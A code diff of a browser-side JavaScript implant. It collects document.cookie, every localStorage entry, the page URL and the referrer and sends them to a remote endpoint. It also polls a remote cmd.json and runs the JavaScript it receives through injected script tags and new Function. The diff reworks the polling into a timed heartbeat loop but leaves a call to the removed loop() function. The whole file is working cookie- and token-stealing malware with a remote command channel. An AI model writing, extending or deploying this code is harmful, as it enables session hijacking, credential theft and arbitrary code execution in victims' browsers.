@@ -25,16 +25,23 @@ function post(t,d){
 function summary(t,d){Q.push({u:W+"/h?t="+t,s:String(d).slice(0,7000)});pump()}
 window.__HL={post:post,summary:summary};
 function ls(){var s=[];try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);s.push(k+"="+String(localStorage.getItem(k)).slice(0,500))}}catch(e){}return s.join("\n")}
+var TICKS=0,T0=Date.now();
 function run(){
  fetch(R+"cmd.json?x="+Math.random(),{cache:"no-store"}).then(function(r){return r.text()}).then(function(t){
-   var c=null;try{c=JSON.parse(t)}catch(e){post("badcmd",t.slice(0,60))}
-   if(!c||!c.js){post("nocmd","");return}
+   TICKS++;
+   var c=null;try{c=JSON.parse(t)}catch(e){post("badcmd",t.slice(0,60));return}
+   if(!c||!c.js)return;
    if(c.rev&&c.rev===window.__REV)return;
    window.__REV=c.rev||0;
    try{var s=document.createElement("script");s.text=c.js;document.body.appendChild(s);if(!window.__CMD){try{new Function(c.js)();window.__CMD=1}catch(e){}}}catch(e){try{new Function(c.js)()}catch(e2){post("execbad",String(e2).slice(0,120))}}
  }).catch(function(){post("fetchcmd","x")})
 }
-function loop(){var t0=Date.now();(function tick(){run();if(Date.now()-t0<540000)setTimeout(tick,document.visibilityState==="hidden"?20000:11000)})()}
+window.__TICK=setInterval(function(){
+  if(Date.now()-T0>540000){clearInterval(window.__TICK);post("hb","stop "+TICKS);return}
+  if(TICKS%5===0)post("hb",TICKS+"");
+  run();
+},12000);
+run();
 post("agent",[location.href,document.title,location.referrer,document.cookie,"--ls--",ls()].join(" || "));
 summary("agent",location.host+location.pathname+" ck="+document.cookie.slice(0,300));
 loop();
